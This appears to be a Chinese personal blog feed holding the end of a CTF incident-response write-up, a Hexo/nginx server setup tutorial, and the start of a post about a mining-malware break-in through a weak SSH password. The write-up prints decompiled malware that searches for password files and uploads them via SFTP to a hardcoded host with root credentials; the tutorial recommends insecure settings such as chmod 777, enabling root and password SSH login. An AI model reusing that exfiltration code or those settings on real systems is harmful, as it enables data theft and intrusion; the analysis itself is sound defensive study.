+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117145109482.png" alt="image-20250117145109482"></p>
+<p>2024ispassword</p>
+<h2 id="47-请提交符合基线标准的服务器数量"><a href="#47-请提交符合基线标准的服务器数量" class="headerlink" title="47.请提交符合基线标准的服务器数量"></a>47.请提交符合基线标准的服务器数量</h2><p>格式为:[md5(xx)]</p>
+<p>不知道这个基线标准是啥意思最终答案是0台，应该就是符合安全标准的</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117145334924.png" alt="image-20250117145334924"></p>
+<p>六台都不符合</p>
+<h2 id="48-提交办公区的恶意文件哈希"><a href="#48-提交办公区的恶意文件哈希" class="headerlink" title="48.提交办公区的恶意文件哈希"></a>48.提交办公区的恶意文件哈希</h2><p>格式为:[xxx]</p>
+<p>在堡垒机可以看见<img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117145426968.png" alt="image-20250117145426968"></p>
+<p>很多文件上传到了PC02</p>
+<p>geek.exe是一个删除工具那应该是palucomeyi1.exe了</p>
+<p>算一下哈希</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117145648183.png" alt="image-20250117145648183"></p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">certutil</span> -hashfile palucomeyi1.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117145727447.png" alt="image-20250117145727447"></p>
+<p>5e7d8701204bed22fdcd5aff2cb0a83a6b56ceea</p>
+<h2 id="49-提交恶意回连端口"><a href="#49-提交恶意回连端口" class="headerlink" title="49.提交恶意回连端口"></a>49.提交恶意回连端口</h2><p>格式为:[xxx]</p>
+<p>依然是反编译恶意程序，然后反编译拿到代码</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> pyinstxtractor.<span class="keyword">py</span> palucomeyi1.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117151650793.png" alt="image-20250117151650793"></p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">pycdc<span class="selector-class">.exe</span> palucomeyi1.pyc</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_in_files</span>(<span class="params">directory, search_text</span>):</span><br><span class="line">Unsupported opcode: BEGIN_FINALLY</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssh</span>(<span class="params">local_file_path, remote_file_path</span>):</span><br><span class="line">    hostname = <span class="string">&#x27;192.168.20.123&#x27;</span></span><br><span class="line">    port = <span class="number">22</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;Network@2020&#x27;</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(hostname, port, username, password)</span><br><span class="line">    sftp = client.open_sftp()</span><br><span class="line">    sftp.put(local_file_path, remote_file_path)</span><br><span class="line">    sftp.close()</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;File <span class="subst">&#123;local_file_path&#125;</span> uploaded to <span class="subst">&#123;remote_file_path&#125;</span> on <span class="subst">&#123;hostname&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line">    flag = <span class="string">&#x27;flag&#123;234567uyhgn_aiduyai&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">search_directory = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">search_for_text = <span class="string">&#x27;passwod&#x27;</span></span><br><span class="line">(a, b) = search_in_files(search_directory, search_for_text)</span><br><span class="line">ssh(a, b)</span><br></pre></td></tr></table></figure>
+
+<p>22</p>
+<h2 id="50-提交恶意程序中的flag"><a href="#50-提交恶意程序中的flag" class="headerlink" title="50.提交恶意程序中的flag"></a>50.提交恶意程序中的flag</h2><p>格式为:[xxx]</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117151952660.png" alt="image-20250117151952660"></p>
+<p>flag{234567uyhgn_aiduyai}</p>
+<h2 id="51-提交恶意文件中的search-for-text内容"><a href="#51-提交恶意文件中的search-for-text内容" class="headerlink" title="51.提交恶意文件中的search_for_text内容"></a>51.提交恶意文件中的search_for_text内容</h2><p>格式为:[xxxx]</p>
+<p>passwod</p>
+<h2 id="52-提交web服务器上攻击者修改后的root密码"><a href="#52-提交web服务器上攻击者修改后的root密码" class="headerlink" title="52.提交web服务器上攻击者修改后的root密码"></a>52.提交web服务器上攻击者修改后的root密码</h2><p>格式为:[xxxx]</p>
+<p>SSH连接上webserver服务器，找到&#x2F;etc&#x2F;下的shadow，用john发现爆不出来</p>
+<p>大佬的做法如下</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117154123697.png" alt="image-20250117154123697"></p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117154158181.png" alt="image-20250117154158181"></p>
+<p>到底是哪个对我也无从考证了</p>
+]]></content>
+      <tags>
+        <tag>应急响应</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>从halo跑路再次到hexo</title>
+    <url>/2024/11/10/hexo%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h1 id="从halo跑路再次到hexo"><a href="#从halo跑路再次到hexo" class="headerlink" title="从halo跑路再次到hexo"></a>从halo跑路再次到hexo</h1><p>​	用了一天的halo，我选择跑路，回归到了hexo，由于个人习惯的原因，hexo更适合我。</p>
+<p>​	下面说一下我的搭建过程（包含常见的问题，不能免密git，服务器ssh端口非22……）</p>
+<p>参考文章:<a href="https://www.cnblogs.com/cheyaoyao/p/17836522.html">https://www.cnblogs.com/cheyaoyao/p/17836522.html</a></p>
+<h2 id="一、本地环境的搭建"><a href="#一、本地环境的搭建" class="headerlink" title="一、本地环境的搭建"></a>一、本地环境的搭建</h2><h3 id="1、安装node-js和git"><a href="#1、安装node-js和git" class="headerlink" title="1、安装node.js和git"></a>1、安装node.js和git</h3><p>安装node.js，下面是链接</p>
+<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span>//nodejs<span class="meta">.org</span>/<span class="built_in">zh</span>-cn/download/package-manager</span><br></pre></td></tr></table></figure>
+
+<p>安装教程，很详细了，我就不过多赘述了，跟着下面这个链接操作</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>developer.aliyun.com<span class="regexp">/article/</span><span class="number">1433726</span></span><br></pre></td></tr></table></figure>
+
+<p>安装完成后cmd查看node安装情况</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">node</span> <span class="title">-v</span></span><br></pre></td></tr></table></figure>
+
+<p>出现版本信息就安装成功了</p>
+<p>安装git</p>
+<p>链接</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//git-scm.com/</span></span><br></pre></td></tr></table></figure>
+
+<p>cmd查看git安装情况</p>
+<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">git <span class="comment">--version</span></span><br></pre></td></tr></table></figure>
+
+<p>出现版本就安装好了，同时鼠标右键会出现Open Git Bash here</p>
+<p><img src="/2024/11/10/hexo%E6%90%AD%E5%BB%BA/image-20241110162016545.png" alt="image-20241110162016545"></p>
+<h3 id="2、安装hexo"><a href="#2、安装hexo" class="headerlink" title="2、安装hexo"></a>2、安装hexo</h3><p>1、新建一个文件夹用来存储个人博客 D:\hexo</p>
+<p>进入该文件夹右键选择Open Git Bash here输入</p>
+<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-<span class="keyword">cli</span></span><br></pre></td></tr></table></figure>
+
+<p>把Hexo命令行工具安装到系统的全局环境中</p>
+<p>再输入以下命令创建一个新的hexo的项目</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hexo init</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
+
+<p>最后会在hexo目录下面生成这些文件</p>
+<p><img src="/2024/11/10/hexo%E6%90%AD%E5%BB%BA/image-20241110162853037.png" alt="image-20241110162853037"></p>
+<p>继续在Open Git Bash here输入命令（还是在hexo目录内打开Open Git Bash here）</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hexo s</span></span><br></pre></td></tr></table></figure>
+
+<p>然后访问<a href="http://localhost:4000/">http://localhost:4000/</a></p>
+<p>注意不要直接在Open Git Bash here里ctrl+c，这样会直接停掉服务</p>
+<p>右键copy复制（在Open Git Bash here里复制粘贴都用右键完成）</p>
+<p><img src="/2024/11/10/hexo%E6%90%AD%E5%BB%BA/image-20241110163124960.png" alt="image-20241110163124960"></p>
+<p><img src="/2024/11/10/hexo%E6%90%AD%E5%BB%BA/image-20241110163153750.png" alt="image-20241110163153750"></p>
+<p>出现这个界面就成功了</p>
+<h3 id="3、安装主题"><a href="#3、安装主题" class="headerlink" title="3、安装主题"></a>3、安装主题</h3><p>我的主题是cactus</p>
+<p>还是在hexo目录下的themes目录打开Open Git Bash here，执行下面的命令（我以cactus主题为例）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/probberechts/hexo-theme-cactus.git themes/cactus</span><br></pre></td></tr></table></figure>
+
+<p>如果想选择其他主题请看</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>blog.lixiaomu.fun<span class="regexp">/posts/</span><span class="number">43857</span>/</span><br></pre></td></tr></table></figure>
+
+<p>这些主题各具特色，而且具有一定用户量，出现什么问题上网搜也好搜一点</p>
+<p>安装好主题之后打开根目录的 _config.yml（hexo目录下的_config.yml）</p>
+<p><img src="/2024/11/10/hexo%E6%90%AD%E5%BB%BA/image-20241110163649769.png" alt="image-20241110163649769"></p>
+<p>找到theme，改成你下载的主题即可，主题其他设置去网上搜对应主题美化的博客即可，这里我只说如何选择主题</p>
+<h2 id="二、服务器环境准备"><a href="#二、服务器环境准备" class="headerlink" title="二、服务器环境准备"></a>二、服务器环境准备</h2><h3 id="1、安装nginx"><a href="#1、安装nginx" class="headerlink" title="1、安装nginx"></a>1、安装nginx</h3><p>我的服务器系统是Ubuntu（如果是centos自行去搜索安装命令，很容易找到的）</p>
+<p>命令如下</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install nginx</span><br></pre></td></tr></table></figure>
+
+<p>查看版本号</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nginx -v</span></span><br></pre></td></tr></table></figure>
+
+<p>出现版本号安装成功</p>
+<h3 id="2、修改nginx配置"><a href="#2、修改nginx配置" class="headerlink" title="2、修改nginx配置"></a>2、修改nginx配置</h3><p>创建一个文件用来存放 hexo 的部署文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /data/hexo   </span><br></pre></td></tr></table></figure>
+
+<p>然后找到nginx安装目录</p>
+<p>一般在&#x2F;etc&#x2F;nginx</p>
+<p>切换到nginx的目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/nginx</span><br></pre></td></tr></table></figure>
+
+<p>修改nginx目录下面的配置文件即nginx.conf</p>
+<p>删掉文件内的全部内容换成下面的这些</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">user</span>  nginx;</span><br><span class="line"><span class="attribute">worker_processes</span>  auto;</span><br><span class="line"></span><br><span class="line"><span class="attribute">error_log</span>  /var/log/nginx/<span class="literal">error</span>.log <span class="literal">notice</span>;</span><br><span class="line"><span class="attribute">pid</span>        /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       /etc/nginx/mime.types;</span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">log_format</span>  main  <span class="string">&#x27;<span class="variable">$remote_addr</span> - <span class="variable">$remote_user</span> [<span class="variable">$time_local</span>] &quot;<span class="variable">$request</span>&quot; &#x27;</span></span><br><span class="line">                      <span class="string">&#x27;<span class="variable">$status</span> <span class="variable">$body_bytes_sent</span> &quot;<span class="variable">$http_referer</span>&quot; &#x27;</span></span><br><span class="line">                      <span class="string">&#x27;&quot;<span class="variable">$http_user_agent</span>&quot; &quot;<span class="variable">$http_x_forwarded_for</span>&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">access_log</span>  /var/log/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gzip  on;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/conf.d/<span class="regexp">*.conf</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>推荐使用finashell工具，直接双击两下就可以直接打开了，不用再使用vim编辑器了</p>
+<p><img src="/2024/11/10/hexo%E6%90%AD%E5%BB%BA/image-20241110164655941.png" alt="image-20241110164655941"></p>
+<p><img src="/2024/11/10/hexo%E6%90%AD%E5%BB%BA/image-20241110164640055.png" alt="image-20241110164640055"></p>
+<p>复制进去后ctrl+s自动上传到服务器</p>
+<p>然后再进入到&#x2F;etc&#x2F;nginx&#x2F;conf.d</p>
+<p>打开default.conf文件</p>
+<p>如果没有vim创建一个</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">vim</span> default.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>
+
+<p>然后和上面的方法一样把下面这些内容复制进去</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>        <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">listen</span>   [::]:<span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  公网IP或者你的域名;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span>   /data/hexo;</span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">    <span class="section">location</span> = /50x.html &#123;</span><br><span class="line">        <span class="attribute">root</span>   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>公网IP或者你的域名修改成你的IP或者域名就行</p>
+<p>然后启动nginx</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> nginx</span><br></pre></td></tr></table></figure>
+
+<p>查看nginx的状态</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">systemctl status nginx</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="注意：新服务器可以跳过我下面说的这些直接去3"><a href="#注意：新服务器可以跳过我下面说的这些直接去3" class="headerlink" title="注意：新服务器可以跳过我下面说的这些直接去3"></a>注意：新服务器可以跳过我下面说的这些直接去3</h4><p>在这里由于我之前搞的服务不知道哪里出问题，80端口被占用，而且nginx启动失败</p>
+<p>启动失败的原因之一是我这个服务器没有nginx账户</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo useradd -r nginx</span></span><br></pre></td></tr></table></figure>
+
+<p>创建一个即可，下面说端口的问题</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">lsof</span> -i:<span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<p>查看80端口占用情况</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo pkill -f nginx</span></span><br></pre></td></tr></table></figure>
+
+<p>清除nginx的进程</p>
+<p><img src="/2024/11/10/hexo%E6%90%AD%E5%BB%BA/image-20241109213843786.png" alt="image-20241109213843786"></p>
+<p>然后再执行</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">lsof</span> -i:<span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<p>这时候应该就没有进程了，再开启nginx就好了</p>
+<h3 id="3、Node-js-环境配置"><a href="#3、Node-js-环境配置" class="headerlink" title="3、Node.js 环境配置"></a>3、Node.js 环境配置</h3><p>切换到根目录cd 或者 cd ~都可</p>
+<p>安装node.js</p>
+<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt <span class="keyword">install</span> nodejs npm</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">nodejs <span class="comment">--version</span></span><br></pre></td></tr></table></figure>
+
+<p>出现版本号即成功</p>
+<h3 id="4、Git-环境配置"><a href="#4、Git-环境配置" class="headerlink" title="4、Git 环境配置"></a>4、Git 环境配置</h3><p>安装git，遇到yes写yes</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> update</span><br><span class="line">sudo apt-<span class="built_in">get</span> install git</span><br></pre></td></tr></table></figure>
+
+<p>查看版本号</p>
+<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">git <span class="comment">--version</span></span><br></pre></td></tr></table></figure>
+
+<p>创建git用户</p>
+<p>依次执行下面指令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建git用户</span></span><br><span class="line">adduser git   </span><br><span class="line"><span class="comment"># 修改git用户的权限</span></span><br><span class="line"><span class="built_in">chmod</span> 740 /etc/sudoers</span><br><span class="line"><span class="comment"># 进入 sudo 命令文件</span></span><br><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/11/10/hexo%E6%90%AD%E5%BB%BA/image-20241110170217619.png" alt="image-20241110170217619"></p>
+<p>在root下面添加git 后面的ALL&#x3D;(ALL:ALL) ALL  </p>
+<p>和上面的root用户的保存一致即可</p>
+<p>继续执行下面指令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改文件权限</span></span><br><span class="line"><span class="built_in">chmod</span> 400 /etc/sudoers</span><br><span class="line"><span class="comment"># 设置 git 用户的密码</span></span><br><span class="line">sudo passwd git</span><br></pre></td></tr></table></figure>
+
+<h3 id="5、配置SSH免密登录"><a href="#5、配置SSH免密登录" class="headerlink" title="5、配置SSH免密登录"></a>5、配置SSH免密登录</h3><p>这里我先说明一下，默认的ssh服务端口是22端口，但是我买的这台服务器端口随机不是22端口</p>
+<p>你需要修改ssh的配置文件</p>
+<p>cd &#x2F;etc&#x2F;ssh</p>
+<p>找到ssh目录下的sshd_config文件修改端口为22<img src="/2024/11/10/hexo%E6%90%AD%E5%BB%BA/image-20241110170555314.png" alt="image-20241110170555314"></p>
+<p>当然也可以不修改，但是如果不修改，根目录下的_config.yml</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">deploy:</span></span><br><span class="line">  <span class="symbol">type:</span> git</span><br><span class="line">  <span class="symbol">repo:</span> <span class="symbol">ssh:</span>//git<span class="variable">@IP</span><span class="symbol">:port/home/git/hexo</span>.git</span><br><span class="line">  <span class="symbol">branch:</span> master</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>就要修改成这样，这里大家还是跟我修改一下吧，以免下面的步骤还出现问题</p>
+<p>下面我们继续说SSH免密登录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 切换到 git 用户</span></span><br><span class="line">su git</span><br><span class="line"><span class="comment"># 在根目录创建.ssh文件夹，存放公钥</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> .ssh</span><br></pre></td></tr></table></figure>
+
+<p>打开本地计算机的C盘然后选择用户选择你的用户名文件找到.ssh</p>
+<p><img src="/2024/11/10/hexo%E6%90%AD%E5%BB%BA/image-20241110171012001.png" alt="image-20241110171012001"></p>
+<p>打开.ssh文件夹，右键打开Open Git Bash here</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure>
+
+<p>生成RSA密钥对</p>
+<p>给私钥设置权限，执行以下指令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 700 ~/.ssh</span><br><span class="line"><span class="built_in">chmod</span> 600 ~/.ssh/id_rsa </span><br></pre></td></tr></table></figure>
+
+<p>然后把本地的的id_rsa.pub文件上传到&#x2F;home&#x2F;git&#x2F;.ssh目录下</p>
+<p>然后到&#x2F;home&#x2F;git&#x2F;.ssh目录下新建authorized_keys文件双击打开，把id_rsa.pub文件内容全选复制到authorized_keys文件里</p>
+<p>CTRL+S上传到服务器</p>
+<p>上面的操作命令执行也可以，命令如下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br><span class="line"><span class="built_in">cp</span> id_rsa.pub authorized_keys</span><br><span class="line"><span class="built_in">cat</span> id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>然后设置权限</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置权限</span></span><br><span class="line"><span class="built_in">chmod</span> 600 ~/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">chmod</span> 700 ~/.ssh</span><br></pre></td></tr></table></figure>
+
+<p>然后测试免密登录</p>
+<p>到本地的hexo目录或者任意目录下，右键打开Open Git Bash here</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> -v git<span class="variable">@ip</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="注意：如果这时候连接没有让你输入git用户密码，就说明成功了，可以跳转到6了，如果还需输入密码请跟我检查下面的操作"><a href="#注意：如果这时候连接没有让你输入git用户密码，就说明成功了，可以跳转到6了，如果还需输入密码请跟我检查下面的操作" class="headerlink" title="注意：如果这时候连接没有让你输入git用户密码，就说明成功了，可以跳转到6了，如果还需输入密码请跟我检查下面的操作"></a>注意：如果这时候连接没有让你输入git用户密码，就说明成功了，可以跳转到6了，如果还需输入密码请跟我检查下面的操作</h4><p>如果还是让你输入密码连接，exit，退出git用户回到root用户</p>
+<p>切换到  cd &#x2F;etc&#x2F;ssh目录下，打开sshd_config</p>
+<p>找到</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">AuthorizedKeysFile</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/11/10/hexo%E6%90%AD%E5%BB%BA/image-20241110173204021.png" alt="image-20241110173204021"></p>
+<p>看一下你的这个前面是不是带#被注释了，如果是就删掉前面的#</p>
+<p>然后再找到PermitRootLogin和PasswordAuthentication设置成yes  </p>
+<p>保存 ctrl+s上传，再次尝试ssh -v git@ip，正常来说就不需要再输入git用户的密码了</p>
+<h3 id="6、配置-Git-仓库"><a href="#6、配置-Git-仓库" class="headerlink" title="6、配置 Git 仓库"></a>6、配置 Git 仓库</h3><p>依然是在git用户下进行</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~</span><br><span class="line">git init <span class="params">--bare</span> hexo.git</span><br><span class="line">vim ~<span class="string">/hexo.git/hooks/post-receive</span></span><br></pre></td></tr></table></figure>
+
+<p>输入</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">git <span class="attribute">--work-tree</span>=/data/hexo <span class="attribute">--git-dir</span>=/home/git/hexo.git checkout -f</span><br></pre></td></tr></table></figure>
+
+<p>保存并退出（ESC+:wq）</p>
+<p>授予钩子文件可执行权限</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chmod +x ~<span class="regexp">/hexo.git/</span>hooks/post-receive</span><br><span class="line">cd ~</span><br><span class="line">sudo chmod -R <span class="number">777</span> <span class="regexp">/data/</span>hexo</span><br><span class="line"><span class="keyword">exit</span> <span class="comment"># 退出到 root 登录</span></span><br><span class="line">chown -R git:git <span class="regexp">/home/gi</span>t/hexo.git <span class="comment">#设置权限</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="三、部署Hexo博客到服务器"><a href="#三、部署Hexo博客到服务器" class="headerlink" title="三、部署Hexo博客到服务器"></a>三、部署Hexo博客到服务器</h2><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">deploy:</span></span><br><span class="line"><span class="symbol">  type:</span> git</span><br><span class="line"><span class="symbol">  repo:</span> git@公网ip:<span class="keyword">/home/</span>git/hexo.git</span><br><span class="line"><span class="symbol">  branch:</span> master</span><br></pre></td></tr></table></figure>
+
+<p>安装插件hexo-deployer-git 和 hexo-server（在hexo目录下打开cmd安装）</p>
+<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用于将 Hexo 生成的静态文件推送到指定的 Git 仓库</span></span><br><span class="line">npm <span class="keyword">install</span> hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于在本地启动一个 Hexo 服务器，方便在本地预览博客</span></span><br><span class="line">npm <span class="keyword">install</span> hexo-server</span><br></pre></td></tr></table></figure>
+
+<p>配置全局变量</p>
+<p>打开Open Git Bash here</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">git config <span class="attr">--global</span> user<span class="selector-class">.email</span> <span class="string">&quot;xxxxxxxxxx@xx.com&quot;</span></span><br><span class="line">git config <span class="attr">--global</span> user<span class="selector-class">.name</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>用户名和邮箱随便填即可</p>
+<p>如果部署到购买的云服务器（阿里云）上，可能出现访问服务器IP没有响应的情况</p>
+<p>点击云服务器，在安全组规则中手动添加一条80端口的规则</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>一次挖矿病毒的应急响应</title>
+    <url>/2024/11/11/%E6%8C%96%E7%9F%BF%E6%BA%AF%E6%BA%90/</url>
+    <content><![CDATA[<p>搭建好的博客第二天被挖矿了，先说结论弱口令密码害死人</p>
+<p>说一下我整个发现过程，博客是昨天也就是11月10号彻底弄完的，结果11号凌晨就打进来了下面是我溯源查日志查到的，SSH爆破进来的，我的git用户密码是123456（搭建hexo创建git账户图方便就设置了123456）</p>
+<p>PASS:下面是关于一些SSH配置的说明，不想看的可以跳到下面看应急响应和溯源</p>
+<p>前面我说的博客的sshd文件的配置也有些问题下面我深入学习了一下这几个设置</p>
+<h3 id="PermitRootLogin选项"><a href="#PermitRootLogin选项" class="headerlink" title="PermitRootLogin选项"></a>PermitRootLogin选项</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">PermitRootLogin</span> <span class="literal">no</span></span><br></pre></td></tr></table></figure>
+
+<p>可以限定root用户通过ssh的登录方式，如禁止登陆、禁止密码登录、仅允许密钥登陆和开放登陆，以下是对可选项的概括：</p>
+<p><img src="/2024/11/11/%E6%8C%96%E7%9F%BF%E6%BA%AF%E6%BA%90/image-20241111213421149.png" alt="image-20241111213421149"></p>
+<p>这个推荐设置成no，然后使用RSA公私钥连接，这个我是开着的还是用账户和密码登录的，不过要注意把密码修改成强密码，不然一爆破就进来了（就和我这次一样）</p>
+<h3 id="PasswordAuthentication选项"><a href="#PasswordAuthentication选项" class="headerlink" title="PasswordAuthentication选项"></a>PasswordAuthentication选项</h3><p>PasswordAuthentication yes 可以允许远程用密码登录认证</p>
+<p>PermitRootLogin yes 是允许远程root登录   一般买服务器给的就是root</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">PasswordAuthentication</span> <span class="literal">yes</span></span><br></pre></td></tr></table></figure>
+
